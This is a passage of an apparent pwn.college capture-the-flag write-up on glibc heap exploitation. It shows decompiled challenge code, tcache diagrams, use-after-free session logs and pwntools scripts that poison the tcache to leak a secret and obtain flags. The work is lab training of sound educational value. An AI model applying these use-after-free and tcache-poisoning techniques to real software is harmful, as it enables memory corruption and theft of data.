┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

Knowing this, if we make the program read the flag to a chunk that we control using UAF, and then free that chunk, when it's `next` pointer is be set, the `size_4` check is overwritten.
We can `free` that chunk, because `read_flag` causes the `key` pointer which was pointing to `TCACHE_perthread_struct`, to be overwritten.

Thus we will be able to use the `puts_flag` command and get the flag.

### Exploit

```
hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
###
### Welcome to /challenge/malloc-mirage-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 896

[*] allocations[0] = malloc(896)
[*] allocations[0] = 0x644fee8f22c0

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 896

[*] allocations[1] = malloc(896)
[*] allocations[1] = 0x644fee8f2650

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag

[*] flag_buffer = malloc(896)
[*] flag_buffer = 0x644fee8f22c0
[*] read the flag!
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{YaCr8LqQNO7XOxRVrb2l58ayfLL.0VO3MDL4ITM0EzW}

+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit

### Goodbye!
```

&nbsp;

## Malloc Mirage (Hard)

```
hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
###
### Welcome to /challenge/malloc-mirage-hard!
###


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
```

We need to figure out the following in order to solve the hard version.
- [ ] Size of memory allocation into which the flag is read

### Binary Analysis

```c title="/challenge/malloc-mirage-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+24h] [rbp-13Ch]
  unsigned int v6; // [rsp+28h] [rbp-138h]
  unsigned int v7; // [rsp+28h] [rbp-138h]
  unsigned int v8; // [rsp+28h] [rbp-138h]
  unsigned int size; // [rsp+2Ch] [rbp-134h]
  const char *size_4; // [rsp+30h] [rbp-130h]
  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-18h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_2020);
            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 66u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 82u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2020);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 94u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        size_4 = (const char *)malloc(784uLL);
        *(_QWORD *)size_4 = 0LL;
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
    }
    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

- [x] Size of memory allocation into which the flag is read: `784`

### Exploit

```
hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
###
### Welcome to /challenge/malloc-mirage-hard!
###


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 784


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 784


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{knO2mcRxdTIDye38lEOhpvy9MXg.0FM4MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit

### Goodbye!
```

&nbsp;

## Seeking Secrets (Easy)

```
hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ /challenge/seeking-secrets-easy 
###
### Welcome to /challenge/seeking-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x423266.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

Lets look at the decompiled code in order to figure out the functionality of the challenge.

### Binary Analysis

```c title="/challenge/seeking-secrets-easy :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 7; ++i )
    byte_423266[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_423266);
  puts("If you can leak out this secret, you can redeem it for the flag.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_TCACHE(main_thread_TCACHE);
            puts(byte_4035BA);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            v7 = atoi(choice);
            if ( v7 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_4035BA);
          v8 = atoi(choice);
          if ( v8 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 297u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_4035BA);
        v9 = atoi(choice);
        if ( v9 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_4035BA);
      v10 = atoi(choice);
      if ( v10 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 323u, "main");
      v3 = malloc_usable_size(ptr[v10]);
      sprintf(choice, "%%%us", v3);
      v4 = malloc_usable_size(ptr[v10]);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
      __isoc99_scanf(choice, ptr[v10]);
      puts(byte_4035BA);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_4035BA);
    if ( !memcmp(choice, byte_423266, 8uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

So the secret is kept at a location in memory, which we have to read from and pass to the `send_flag`.

### Polluting Tcache `entry_struct`

Let's say we allocate two chunks `A`, `B` of memory and then free them. It would look something as follows:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

Then we use the `scanf` command and read to the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 

We can overwrite this with the address of the secret.
This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  next: &SECRET   │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
┆  TCACHE_entry B  ┆     │
├──────────────────┤     │
│    next: NULL    │     │
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET      ┆
├──────────────────┤
│   next: secret   │ 
├──────────────────┤
│    key: ....     │ 
└──────────────────┘
```

Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `TCACHE_perthread_struct`, those are the two free chunks. And the first 8 bytes of the `SECRET` chunk would hold the secret value.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  TCACHE_perthread_struct Void                                               ┊
┊            ┏━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_128: 0          ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_128: secret[:8] ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  TCACHE_entry A  ┆
├──────────────────┤
│  ..............  │ 
├──────────────────┤  
│       NULL       │ 
└──────────────────┘  


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET      ┆
├──────────────────┤
│    secret[:8]    │ 
├──────────────────┤
│       NULL       │ 
└──────────────────┘
```

We just have to call puts on this chunk and get the value.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-secrets-easy", level='error')

# 1. Capture the target address
p.recvuntil(b"secret stored at ")
addr_hex = p.recvuntil(b".").strip(b".").decode()
secret_addr = int(addr_hex, 16)
print(f"[*] Target Secret Address: {hex(secret_addr)}")

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"puts")
p.sendline(b"1")
leak_text = p.recvuntil(b"Data: ").decode()
secret = p.recvline().strip().decode()
print(f"{leak_text}{secret}")

p.sendline(b"send_flag")
p.sendline(secret.encode())
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ python ~/script.py
###
### Welcome to /challenge/seeking-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x423266.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x17e5f2c0

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x17e5f350

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x17e5f350           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x17e5f350          | 0x17e5f010          |
| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] scanf("%136s", allocations[0])

+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x423266            | 0x17e5f000          |
| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x17e5f2c0
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x423266             | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x423266

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Index: 
[*] puts(allocations[1])
Data: frhrpzgh

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{0jM840YHF5jL79Sl0oYvY6T92Nt.0VM4MDL4ITM0EzW}
```

&nbsp;

## Seeking Secrets (Hard)

```
hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ /challenge/seeking-secrets-hard 
###
### Welcome to /challenge/seeking-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

### Binary Analysis

```c title="/challenge/seeking-secrets-hard :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 7; ++i )
    byte_422961[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_40214C);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_40214C);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_40214C);
      v9 = atoi(choice);
      if ( v9 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
      v3 = malloc_usable_size(ptr[v9]);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr[v9]);
      puts(byte_40214C);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_40214C);
    if ( !memcmp(choice, byte_422961, 8uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

The solution for this level remains the same as the easy one.

### Exploit 

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-secrets-hard", level='error')

secret_addr = 0x422961

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"puts")
p.sendline(b"1")
p.recvuntil(b"Data: ")
secret = p.recvline().strip().decode()
print(f"[*] Leaked Secret: {secret}")

p.sendline(b"send_flag")
p.sendline(secret.encode()) 
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-secrets-hard:/$ python ~/script.py
###
### Welcome to /challenge/seeking-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

